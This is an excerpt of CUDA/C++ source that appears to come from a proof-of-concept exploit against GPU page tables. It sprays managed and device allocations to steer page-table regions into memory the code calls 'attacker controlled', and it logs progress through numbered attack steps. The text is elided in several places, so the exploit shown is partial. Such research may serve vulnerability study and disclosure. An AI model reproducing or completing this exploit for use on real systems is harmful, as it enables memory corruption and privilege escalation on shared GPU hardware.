...
{
  uint8_t *temp;
  if (!first_PT_region_attack (num_alloc_init, threshold, skip, ctx))
    {
  ...
  for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
      ...
      // 511 as there already exist an entry when we first generated the
      // previous 4KB PT.
      if (i < skip || i % 511 == 0)
        continue;
  ...
  for (uint64_t i = 0;
       i < (((uint64_t)corrupted_ptr % ALLOC_SIZE) / (4 * KB)) + 1; i += 1)
    {
      cudaMallocManaged (&temp, ALLOC_SIZE + 4 * KB);
  ...
  /* Fill the PT region we now control with cudaMalloc'ed memory
   * (non-evictable) */
  ...
  for (uint64_t i = 0; i < 500; i += 1)
    {
      ...
      memset_ptr<<<1, 1>>> (cudaMalloced_ptrs[i],
                            (uint64_t)cudaMalloced_ptrs[i], 8);
    }
  ...
  if (debug_enabled ())
    {
      std::cout << "(Step 4 Done) Second PT Region Now in Attacker Controlled "
                   "Region: Press "
